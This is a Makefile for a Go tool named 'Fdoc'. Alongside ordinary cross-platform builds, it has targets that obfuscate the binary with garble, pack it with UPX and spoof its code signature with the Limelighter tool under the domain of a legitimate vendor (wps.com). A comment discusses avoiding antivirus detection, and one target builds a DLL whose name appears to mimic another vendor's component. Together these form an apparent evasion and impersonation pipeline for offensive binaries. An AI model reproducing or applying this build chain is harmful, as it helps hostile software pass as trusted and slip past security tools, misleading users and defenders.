# Static cross-compile
BUILD_ENV := CGO_ENABLED=0
LDFLAGS-Linux=-v -a -ldflags '-s -w' -gcflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}" -asmflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}"
#LDFLAGS-Win=-v -a -ldflags '-s -w -H windowsgui' -gcflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}" -asmflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}"
LDFLAGS-Win=-v -a -ldflags '-s -w' -gcflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}" -asmflags="all=-trimpath=${PWD};${GOPATH};${GOROOT}"

# Code signing helper
Limelighter=~/my_tools/Limelighter/Limelighter
SignDomain=wps.com

.PHONY: all setup build-linux build-osx build-windows
all: setup build-linux build-osx build-windows
all-Garble: build-linux-Garble build-osx-Garble build-windows-Garble
signed: build-windows-Garble-upx-signed

Name := Fdoc

setup:
	mkdir -p build/linux
	mkdir -p build/osx
	mkdir -p build/windows

build-linux:
	${BUILD_ENV} GOARCH=amd64 GOOS=linux go build ${LDFLAGS-Linux} -o build/linux/${Name}-linux-amd64 .
	${BUILD_ENV} GOARCH=arm64 GOOS=linux go build ${LDFLAGS-Linux} -o build/linux/${Name}-linux-arm64 .

build-osx:
	${BUILD_ENV} GOARCH=amd64 GOOS=darwin go build ${LDFLAGS-Linux} -o build/osx/${Name}-darwin-amd64 .
	${BUILD_ENV} GOARCH=arm64 GOOS=darwin go build ${LDFLAGS-Linux} -o build/osx/${Name}-darwin-arm64 .

# Prefer plain build on Windows; obfuscation often triggers AV
build-windows:
	${BUILD_ENV} GOARCH=amd64 GOOS=windows go build ${LDFLAGS-Win} -o build/windows/${Name}-windows-amd64.exe .

build-linux-Garble:
	${BUILD_ENV} GOARCH=amd64 GOOS=linux garble -literals -tiny -seed=random build ${LDFLAGS-Linux}  -o buildByGarble/linux/${Name}-linux-amd64 main.go;
	#${BUILD_ENV} GOARCH=386 GOOS=linux garble -literals -tiny -seed=random build ${LDFLAGS-Linux}  -o buildByGarble/linux/${Name}-linux-x86 main.go;

build-osx-Garble:
	${BUILD_ENV} GOARCH=amd64 GOOS=darwin garble -literals -tiny -seed=random build ${LDFLAGS-Linux}  -o buildByGarble/osx/${Name}-darwin-amd64 main.go;

build-windows-Garble:
	${BUILD_ENV} GOARCH=amd64 GOOS=windows garble -literals -tiny -seed=random build ${LDFLAGS-Win}  -o buildByGarble/windows/${Name}-windows-amd64.exe main.go;
	#${BUILD_ENV} GOARCH=386 GOOS=windows garble -literals -tiny -seed=random build ${LDFLAGS-Win}  -o buildByGarble/windows/${Name}-windows-x86.exe main.go;

build-windows-signed:
	${BUILD_ENV} GOARCH=amd64 GOOS=windows go build ${LDFLAGS-Win}  -o buildSigned/windows/${Name}-windows-amd64.exe main.go;${Limelighter} -I buildSigned/windows/${Name}-windows-amd64.exe -O buildSigned/windows/${Name}-windows-amd64-signed.exe -Domain ${SignDomain}
	#${BUILD_ENV} GOARCH=386 GOOS=windows garble -literals -tiny -seed=random build ${LDFLAGS-Win}  -o buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe main.go;upx -9 buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe;rm buildByGarbleUpxSigned/windows/${Name}-windows-x86-signed.exe;${Limelighter} -I buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe -O buildByGarbleUpxSigned/windows/${Name}-windows-x86-signed.exe -Domain ${SignDomain}


build-windows-Garble-upx-signed:
	${BUILD_ENV} GOARCH=amd64 GOOS=windows garble -literals -tiny -seed=random build ${LDFLAGS-Win}  -o buildByGarbleUpxSigned/windows/${Name}-windows-amd64.exe main.go;upx -9 buildByGarbleUpxSigned/windows/${Name}-windows-amd64.exe;rm buildByGarbleUpxSigned/windows/${Name}-windows-amd64-signed.exe;${Limelighter} -I buildByGarbleUpxSigned/windows/${Name}-windows-amd64.exe -O buildByGarbleUpxSigned/windows/${Name}-windows-amd64-signed.exe -Domain ${SignDomain}
	#${BUILD_ENV} GOARCH=386 GOOS=windows garble -literals -tiny -seed=random build ${LDFLAGS-Win}  -o buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe main.go;upx -9 buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe;rm buildByGarbleUpxSigned/windows/${Name}-windows-x86-signed.exe;${Limelighter} -I buildByGarbleUpxSigned/windows/${Name}-windows-x86.exe -O buildByGarbleUpxSigned/windows/${Name}-windows-x86-signed.exe -Domain ${SignDomain}


# DLL build requires enabling cgo import in a dedicated main_dll.go
build-dll:
	CGO_ENABLED=1 GOARCH=386 GOOS=windows CC=i686-w64-mingw32-gcc go build ${LDFLAGS-Win} -buildmode=c-shared -o build/windows/dll/2345DLAgent.dll main_dll.go
